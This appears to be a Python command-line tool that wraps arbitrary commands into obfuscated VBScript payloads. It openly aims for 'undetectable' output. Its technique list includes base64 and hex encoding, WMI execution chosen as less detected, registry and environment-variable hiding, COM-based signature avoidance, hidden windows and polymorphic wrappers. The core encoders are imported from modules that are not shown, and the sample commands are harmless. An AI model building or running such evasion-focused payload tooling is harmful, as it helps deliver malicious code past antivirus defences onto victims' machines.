#!/usr/bin/env python3
"""
Unified Payload Generator for VBS Encryption
Provides clean, easy-to-use API for generating undetectable VBS payloads
"""

from vbs_encoder import VBSEncoder, generate_clean_vbs_payload, ObfuscationConfig
from vbs_advanced_obfuscation import create_stealthy_payload
from typing import Optional, List
import argparse
import sys
import re


class CommandValidationError(Exception):
    """Raised when command validation fails"""
    pass


class PayloadGenerator:
    """Main interface for generating payloads"""

    # Constants for input validation
    MAX_COMMAND_LENGTH = 8192  # VBS has practical limits on string lengths
    MAX_PAYLOAD_LENGTH = 65536  # Maximum VBS file size
    DANGEROUS_PATTERNS = [
        r"<script[^>]*>",  # Script injection
        r"javascript:",    # Script protocol
        r"on\w+\s*=",      # Event handlers
        r"<!--",           # HTML comments
        r"-->",            # HTML comment close
    ]

    def __init__(self):
        self.encoder = VBSEncoder()
        self.techniques = [
            "basic",
            "base64",
            "hex",
            "array",
            "wmi",
            "registry",
            "env",
            "com",
            "obfuscated_calls",
            "filewriter",
            "multi_encoding",
            "hidden_execution",
        ]

    def _validate_command(self, command: str) -> None:
        """
        Validate command input for length, format, and dangerous patterns

        Args:
            command: Command string to validate

        Raises:
            CommandValidationError: If validation fails
        """
        if not command:
            raise CommandValidationError("Command cannot be empty")

        if not isinstance(command, str):
            raise CommandValidationError(f"Command must be string, got {type(command).__name__}")

        # Check length
        if len(command) > self.MAX_COMMAND_LENGTH:
            raise CommandValidationError(
                f"Command exceeds maximum length of {self.MAX_COMMAND_LENGTH} characters "
                f"(got {len(command)})"
            )

        if len(command) < 1:
            raise CommandValidationError("Command must contain at least 1 character")

        # Check for dangerous patterns
        for pattern in self.DANGEROUS_PATTERNS:
            if re.search(pattern, command, re.IGNORECASE):
                raise CommandValidationError(
                    f"Command contains dangerous pattern: {pattern}"
                )

        # Validate technique compatibility - ensure command won't break VBS syntax
        # VBS strings must not contain unescaped quotes unless properly handled
        if '"""' in command:
            raise CommandValidationError("Command cannot contain three consecutive quotes")

    def _validate_technique(self, technique: str) -> None:
        """
        Validate technique parameter

        Args:
            technique: Technique name to validate

        Raises:
            ValueError: If technique is invalid
        """
        if technique not in self.techniques:
            raise ValueError(
                f"Unknown technique: {technique}. Available: {', '.join(self.techniques)}"
            )

    def _validate_obfuscation_level(self, obfuscation_level: str) -> None:
        """
        Validate obfuscation level parameter

        Args:
            obfuscation_level: Obfuscation level to validate

        Raises:
            ValueError: If level is invalid
        """
        valid_levels = ["low", "medium", "high"]
        if obfuscation_level not in valid_levels:
            raise ValueError(
                f"Invalid obfuscation level: {obfuscation_level}. "
                f"Must be one of: {', '.join(valid_levels)}"
            )

    def generate(
        self, command: str, technique: str = "base64", obfuscation_level: str = "high"
    ) -> str:
        """
        Generate VBS payload using specified technique

        Args:
            command: Command to execute
            technique: Obfuscation technique to use
            obfuscation_level: "low", "medium", "high"

        Returns:
            VBS payload code

        Raises:
            CommandValidationError: If command validation fails
            ValueError: If technique or obfuscation_level is invalid
        """
        # Validate all inputs
        self._validate_command(command)
        self._validate_technique(technique)
        self._validate_obfuscation_level(obfuscation_level)

        try:
            if technique == "basic":
                payload = self.encoder.create_wscript_hidden_execution(command)

            elif technique == "base64":
                payload = self.encoder.create_full_obfuscated_payload(command, "base64")

            elif technique == "hex":
                payload = self.encoder.create_full_obfuscated_payload(command, "hex")

            elif technique == "array":
                payload = self.encoder.create_full_obfuscated_payload(command, "array")

            elif technique in ["wmi", "registry", "env", "com", "obfuscated_calls", "filewriter", "multi_encoding"]:
                payload = create_stealthy_payload(command, technique)

            elif technique == "hidden_execution":
                payload = generate_clean_vbs_payload(command, obfuscation_level)
                if obfuscation_level == "high":
                    payload = self.encoder.create_polymorphic_wrapper(payload)

            else:
                # This should not happen due to _validate_technique, but fail safely
                raise ValueError(f"Unhandled technique: {technique}")

            # Validate generated payload size
            if len(payload) > self.MAX_PAYLOAD_LENGTH:
                raise CommandValidationError(
                    f"Generated payload exceeds maximum size of {self.MAX_PAYLOAD_LENGTH} bytes "
                    f"(got {len(payload)}). Try a shorter command or different technique."
                )

            return payload

        except (CommandValidationError, ValueError):
            # Re-raise validation errors
            raise
        except Exception as e:
            # Wrap other exceptions with context
            raise RuntimeError(
                f"Payload generation failed for technique '{technique}': {str(e)}"
            ) from e

    def list_techniques(self) -> List[str]:
        """List all available techniques"""
        return self.techniques

    def get_technique_info(self, technique: str) -> str:
        """Get description of a technique"""
        descriptions = {
            "basic": "Simple WScript.Shell execution (minimal obfuscation)",
            "base64": "Base64 encoding with MSXML decoder (standard stealth)",
            "hex": "Hex encoding with Chr() decoder (good obfuscation)",
            "array": "Array-based hex encoding (moderate stealth)",
            "wmi": "WMI-based process execution (less detected than Shell)",
            "registry": "Payload stored in registry, assembled at runtime",
            "env": "Payload hidden in environment variables",
            "com": "Various COM objects to avoid signature detection",
            "obfuscated_calls": "Function names built via string concatenation",
            "filewriter": "Write command to temp file, execute via cmd",
            "multi_encoding": "Multiple encoding layers for maximum obfuscation",
            "hidden_execution": "Wrapped payload with polymorphic obfuscation",
        }
        return descriptions.get(technique, "Unknown technique")


def main():
    parser = argparse.ArgumentParser(
        description="VBS Payload Generator for Security Research",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python payload_generator.py -c "powershell.exe -Command 'Write-Host test'" --technique base64
  python payload_generator.py -c "cmd /c echo test" --technique wmi --obfuscation high
  python payload_generator.py --list-techniques
  python payload_generator.py --technique-info wmi
        """,
    )

    parser.add_argument(
        "-c",
        "--command",
        help="Command to encode in VBS payload",
    )
    parser.add_argument(
        "-t",
        "--technique",
        default="base64",
        help="Obfuscation technique (see --list-techniques)",
    )
    parser.add_argument(
        "-o",
        "--obfuscation",
        default="high",
        choices=["low", "medium", "high"],
        help="Obfuscation level",
    )
    parser.add_argument(
        "--list-techniques",
        action="store_true",
        help="List all available techniques",
    )
    parser.add_argument(
        "--technique-info",
        metavar="TECHNIQUE",
        help="Get detailed info about a technique",
    )
    parser.add_argument(
        "-f",
        "--file",
        help="Save output to file",
    )

    args = parser.parse_args()

    generator = PayloadGenerator()

    if args.list_techniques:
        print("Available VBS Obfuscation Techniques:")
        print("-" * 50)
        for tech in generator.list_techniques():
            print(f"  {tech:<20} - {generator.get_technique_info(tech)}")
        return

    if args.technique_info:
        print(f"Technique: {args.technique_info}")
        print(f"Description: {generator.get_technique_info(args.technique_info)}")
        return

    if not args.command:
        print("Error: --command required (unless using --list-techniques)")
        parser.print_help()
        sys.exit(1)

    # Generate payload
    try:
        payload = generator.generate(
            args.command, args.technique, args.obfuscation
        )

        if args.file:
            with open(args.file, "w") as f:
                f.write(payload)
            print(f"[+] Payload written to {args.file}")
        else:
            print(payload)

    except CommandValidationError as e:
        print(f"[!] Validation Error: {e}", file=sys.stderr)
        sys.exit(2)
    except ValueError as e:
        print(f"[!] Invalid Parameter: {e}", file=sys.stderr)
        sys.exit(2)
    except RuntimeError as e:
        print(f"[!] Generation Error: {e}", file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(f"[!] Unexpected Error: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
